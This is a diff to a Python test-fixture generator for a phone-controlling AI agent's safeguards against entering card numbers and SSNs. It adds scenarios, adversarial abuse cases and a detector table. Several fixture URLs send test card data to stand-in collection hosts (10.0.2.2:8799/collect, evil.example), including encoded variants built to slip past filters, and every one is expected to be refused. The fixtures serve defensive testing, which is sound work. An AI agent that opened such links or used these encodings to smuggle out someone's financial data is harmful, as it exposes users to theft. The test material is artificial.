@@ -1815,7 +1815,180 @@ ADVERSARIAL += [
 ]
 
 
+# --- financial safeguards, 2026-10-10 (abuse series F2, F3) ------------------------------------------------------------
+# F2: a card number or SSN typed into ANY field asks (tap level), every time: never covered by a task approval,
+# "everyday" or a grant; refused under Don't ask. F3: a link carrying one is refused (open_url, typed into the address
+# bar, ENTER on an address bar holding it). The detector itself: sensitive_numbers.json below.
+CARD = "4111 1111 1111 1111"
+EXFIL = "http://10.0.2.2:8799/collect?card=4111111111111111&cvv=123"
+
+
+def web_form(*kids):
+    return screen(app("com.android.chrome", [node(cls="android.webkit.WebView", bounds=(0, 200, W, H), children=list(kids))]),
+                  labels=LABELS)
+
+
+def web_field(hint="", id="", top=700):
+    return node(id=id, cls="android.widget.EditText", hint=hint, editable=True, focused=True, bounds=(40, top, 1040, top + 100))
+
+
+SCREENS.update({
+    "web_name_on_card": web_form(node(text="Payment", bounds=(40, 220, 1040, 300)), web_field(hint="Name on card")),
+    "web_ssn_form": web_form(node(text="Apply for the Platinum card", bounds=(40, 220, 1040, 300)),
+                             node(text="Social Security number", bounds=(40, 600, 1040, 680)), web_field()),
+    "web_plain_form": web_form(node(text="Contact us", bounds=(40, 220, 1040, 300)), web_field(hint="Reference")),
+    "chrome_url_focus": screen(app("com.android.chrome", [
+        node(text="", id="com.android.chrome:id/url_bar", cls="android.widget.EditText", hint="Search or type URL",
+             editable=True, focused=True, bounds=(100, 100, 1000, 200))]), labels=LABELS),
+    "chrome_url_card": screen(app("com.android.chrome", [
+        node(text=EXFIL, id="com.android.chrome:id/url_bar", cls="android.widget.EditText", editable=True, focused=True,
+             bounds=(100, 100, 1000, 200))]), labels=LABELS),
+})
+SENSITIVE = ask("sensitive_number", rule="risk:sensitive_number", level="tap")
+SCENARIOS += [
+    sc("sensitive numbers: a card number or SSN typed into any field asks, at tap level, once per yes", [
+        step("type_text", "web_name_on_card", SENSITIVE, text=CARD),
+        {"approve": "last", "sig": "valid"},
+        step("type_text", "web_name_on_card", allow(), text=CARD),  # the approved act, once
+        step("type_text", "web_name_on_card", SENSITIVE, text=CARD),  # and only once
+        step("type_text", "compose_field", SENSITIVE, text="my card 4111-1111-1111-1111 12/29 123"),
+        step("type_text", "compose_field", SENSITIVE, text="4111111111111111"),
+        step("type_text", "compose_field", SENSITIVE, text="378282246310005"),  # Amex, 15 digits
+        step("type_text", "web_ssn_form", SENSITIVE, text="000-12-3456"),  # a test SSN where the page says SSN
+        step("type_text", "web_ssn_form", SENSITIVE, text="000123456"),
+        step("type_text", "web_plain_form", SENSITIVE, text="123-45-6789"),  # a valid SSN shape anywhere
+        step("type_text", "compose_webview", ask("fill", rule="risk:card_field", level="fingerprint"), text=CARD)],
+       tags=["sensitive_number"]),
+    sc("sensitive numbers: phone numbers, order numbers, dates and near-misses don't ask", [
+        step("type_text", "compose_field", allow(), text="Call me at 415-555-2671"),
+        step("type_text", "compose_field", allow(), text="+1 415 555 2671 or +49 1512 3456789"),
+        step("type_text", "compose_field", allow(), text="Order 112-1234567-1234567"),
+        step("type_text", "compose_field", allow(), text="Meet on 2026-10-10 at 5"),
+        step("type_text", "compose_field", allow(), text="4111 1111 1111 1112"),  # fails the Luhn check
+        step("type_text", "compose_field", allow(), text="1760000000000"),  # a millisecond timestamp
+        step("type_text", "web_plain_form", allow(), text="000-12-3456"),  # an invalid SSN with no SSN label
+        step("type_text", "web_plain_form", allow(), text="123456789")], tags=["sensitive_number", "friction"]),
+    sc("sensitive numbers: a task approval doesn't cover typing one", [
+        task_grant(ask("task"), text="text my card number to Mom"), {"approve": "last", "sig": "valid"},
+        step("type_text", "compose_field", SENSITIVE, text=CARD, task="t1", task_text="text my card number to Mom")],
+       tags=["sensitive_number", "task_grant"]),
+    sc("sensitive numbers: \"everyday\" doesn't cover typing one", [
+        EVERYDAY, step("type_text", "compose_field", SENSITIVE, text=CARD)], tags=["sensitive_number"]),
+    sc("sensitive numbers: refused under Don't ask", [
+        {"policy": {"type": "never", "duration_ms": 3600000}, "sig": "valid", "expect_accepted": True},
+        step("type_text", "compose_field", refuse("gate_denied", rule="never:sensitive_number"), mode="never", text=CARD),
+        step("type_text", "web_ssn_form", refuse("gate_denied", rule="never:sensitive_number"), mode="never",
+             text="000-12-3456"),
+        step("type_text", "compose_field", allow(), mode="never", text="On my way")], tags=["sensitive_number", "modes"]),
+    sc("links carrying a card number or SSN are refused, however they're written", [
+        step("open_url", "launcher", refuse("gate_denied", rule="builtin:sensitive_link"), url=EXFIL),
+        step("open_url", "launcher", refuse("gate_denied", rule="builtin:sensitive_link"),
+             url="http://10.0.2.2:8799/collect?card=4111%201111%201111%201111"),
+        step("open_url", "launcher", refuse("gate_denied", rule="builtin:sensitive_link"),
+             url="http://10.0.2.2:8799/collect?card=4111%2B1111%2B1111%2B1111"),
+        step("open_url", "launcher", refuse("gate_denied", rule="builtin:sensitive_link"),
+             url="http://10.0.2.2:8799/collect?card=4111%25201111%25201111%25201111"),  # encoded twice
+        step("open_url", "launcher", refuse("gate_denied", rule="builtin:sensitive_link"),
+             url="https://evil.example/p/4111-1111-1111-1111"),
+        step("open_url", "launcher", refuse("gate_denied", rule="builtin:sensitive_link"),
+             url="https://evil.example/#c=4111111111111111"),
+        step("open_url", "launcher", refuse("gate_denied", rule="builtin:sensitive_link"),
+             url="https://evil.example/apply?ssn=000-12-3456"),
+        step("open_url", "launcher", refuse("gate_denied", rule="builtin:sensitive_link"),
+             url="https://4111111111111111.evil.example/"),
+        step("type_text", "chrome_url_focus", refuse("gate_denied", rule="builtin:sensitive_link"), text=EXFIL),
+        step("key", "chrome_url_card", refuse("gate_denied", rule="builtin:sensitive_link"), name="ENTER"),
+        step("open_url", "launcher", allow(), url="https://example.com/"),
+        step("open_url", "launcher", allow(), url="https://maps.example/@37.7749295,-122.41941550000001,15z"),
+        step("open_url", "launcher", allow(), url="https://shop.example/order/112-1234567-1234567?t=1760000000000"),
+        step("open_url", "launcher", allow(), url="tel:+4915123456789")], tags=["sensitive_number", "hard_deny"]),
+]
+ADVERSARIAL += [
+    sc("card digits typed into 'Name on card' (abuse D20b)",
+       [step("type_text", "web_name_on_card", ask("sensitive_number"), text=CARD)]),
+    sc("an SSN typed into an unlabeled field under an SSN label (abuse D23)",
+       [step("type_text", "web_ssn_form", ask("sensitive_number"), text="000-12-3456")]),
+    sc("a card number sent out in a link's query (abuse D21b)",
+       [step("open_url", "launcher", refuse("gate_denied", rule="builtin:sensitive_link"), url=EXFIL)]),
+]
+
+# The detector on its own, shared by the server (openmob/agent/sensitive.py), the phone (SensitiveNumbers.kt) and the
+# reference engine: {"text", "ssn_context", "card_field", "expect"} and {"url", "expect"} (expect: "card", "ssn" or null).
+SENSITIVE_NUMBERS = {
+    "texts": [
+        {"text": t, "ssn_context": s, "card_field": c, "expect": e} for t, s, c, e in [
+            ("4111 1111 1111 1111", False, False, "card"),
+            ("4111111111111111", False, False, "card"),
+            ("4111-1111-1111-1111", False, False, "card"),
+            ("4111 1111 1111 1111 12/29 123", False, False, "card"),
+            ("card: 4111111111111111 exp 12/29", False, False, "card"),
+            ("5555555555554444", False, False, "card"),
+            ("378282246310005", False, False, "card"),
+            ("3782 822463 10005", False, False, "card"),
+            ("6011111111111117", False, False, "card"),
+            ("2223003122003222", False, False, "card"),
+            ("４１１１１１１１１１１１１１１１", False, False, "card"),  # fullwidth digits (NFKC)
+            ("4111 1111 1111 1112", False, False, None),  # Luhn fails
+            ("1111111111111117", False, False, None),  # first digit outside 2-6
+            ("+4915123456789", False, False, None),  # an international phone number
+            ("+1 415 555 2671", False, False, None),
+            ("415-555-2671", False, False, None),
+            ("(415) 555-2671", False, False, None),
+            ("555-123-4567 555-987-6543", False, False, None),  # two phone numbers in a row
+            ("2026-10-10", False, False, None),
+            ("10/10/2026", False, False, None),
+            ("Order 112-1234567-1234567", False, False, None),
+            ("1760000000000", False, False, None),
+            ("-122.41941550000001", False, False, None),  # a coordinate's decimals
+            ("1Z999AA10123456784", False, False, None),
+            ("4242", False, False, None),
+            ("123-45-6789", False, False, "ssn"),
+            ("SSN 123-45-6789.", False, False, "ssn"),
+            ("000-12-3456", False, False, None),
+            ("000-12-3456", True, False, "ssn"),
+            ("666-12-3456", False, False, None),
+            ("900-12-3456", False, False, None),
+            ("123-00-6789", False, False, None),
+            ("123-45-0000", False, False, None),
+            ("123456789", False, False, None),
+            ("123456789", True, False, "ssn"),
+            ("123 45 6789", False, False, None),
+            ("123 45 6789", True, False, "ssn"),
+            ("123-45 6789", True, False, None),  # mixed separators
+            ("1234-56-7890", True, False, None),
+            ("123", False, True, "card"),  # a CVV in a card field
+            ("12/29", False, True, "card"),
+            ("12", False, True, None),
+            ("John Smith", False, True, None),
+        ]],
+    "urls": [
+        {"url": u, "expect": e} for u, e in [
+            (EXFIL, "card"),
+            ("http://10.0.2.2:8799/collect?card=4111111111111111&exp=1229&cvv=123", "card"),
+            ("http://x.example/c?card=4111%201111%201111%201111", "card"),
+            ("http://x.example/c?card=4111%2B1111%2B1111%2B1111", "card"),
+            ("http://x.example/c?card=4111+1111+1111+1111", "card"),
+            ("http://x.example/c?c=4111%25201111%25201111%25201111", "card"),
+            ("http://x.example/c?c=%34%31%31%31%31%31%31%31%31%31%31%31%31%31%31%31", "card"),
+            ("http://x.example/c#4111-1111-1111-1111", "card"),
+            ("https://4111111111111111.evil.example/", "card"),
+            ("http://x.example/apply?ssn=000123456", "ssn"),
+            ("http://x.example/apply?social_security=000-12-3456", "ssn"),
+            ("http://x.example/a?id=123-45-6789", "ssn"),
+            ("http://x.example/a?id=000-12-3456", None),
+            ("https://maps.example/@37.7749295,-122.41941550000001,15z", None),
+            ("https://www.youtube.com/watch?v=dQw4w9WgXcQ", None),
+            ("https://x.example/?t=1760000000000", None),
+            ("tel:+4915123456789", None),
+            ("tel:5551234", None),
+            ("https://shop.example/order/112-1234567-1234567", None),
+            ("https://x.example/%E2%82", None),  # malformed UTF-8 stays harmless
+        ]],
+}
+
+
 def main():
+    (HERE / "sensitive_numbers.json").write_text(json.dumps(SENSITIVE_NUMBERS, indent=1, ensure_ascii=False) + "\n")
     (HERE / "screens.json").write_text(json.dumps(SCREENS, indent=1, ensure_ascii=False) + "\n")
     (HERE / "scenarios.json").write_text(json.dumps(SCENARIOS, indent=1, ensure_ascii=False) + "\n")
     (HERE / "adversarial.json").write_text(json.dumps(ADVERSARIAL, indent=1, ensure_ascii=False) + "\n")
